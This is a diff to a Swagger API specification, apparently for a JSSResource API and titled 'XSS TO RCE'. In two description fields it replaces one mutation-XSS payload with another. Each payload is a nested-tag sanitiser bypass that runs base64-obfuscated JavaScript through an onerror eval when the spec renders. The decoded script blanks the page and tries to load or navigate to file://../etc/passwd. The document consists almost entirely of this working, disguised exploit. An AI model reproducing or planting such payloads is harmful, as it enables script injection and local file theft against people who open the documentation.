@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS TO RCE BY I_EH_DREAMER
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzthLmFjdGlvbj0nZmlsZTovLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QnO2EuaW5uZXJIVE1MPSc8Y2VudGVyPjxpZnJhbWUgc3JjPWZpbGU6Ly8uLi8uLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkPjwvaWZyYW1lPjwvY2VudGVyPic7IGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzt3aW5kb3cubG9jYXRpb249J2ZpbGU6Ly8uLi8uLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkJzthLmlubmVySFRNTD0nPGNlbnRlcj48aWZyYW1lIHNyYz1maWxlOi8vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZD48L2lmcmFtZT48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==' onerror='eval(atob(this.id))'>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzthLmFjdGlvbj0nZmlsZTovLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QnO2EuaW5uZXJIVE1MPSc8Y2VudGVyPjxpZnJhbWUgc3JjPWZpbGU6Ly8uLi8uLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkPjwvaWZyYW1lPjwvY2VudGVyPic7IGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzt3aW5kb3cubG9jYXRpb249J2ZpbGU6Ly8uLi8uLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkJzthLmlubmVySFRNTD0nPGNlbnRlcj48aWZyYW1lIHNyYz1maWxlOi8vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZD48L2lmcmFtZT48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==' onerror='eval(atob(this.id))'>"></form>
 
           format: int64
           in: path
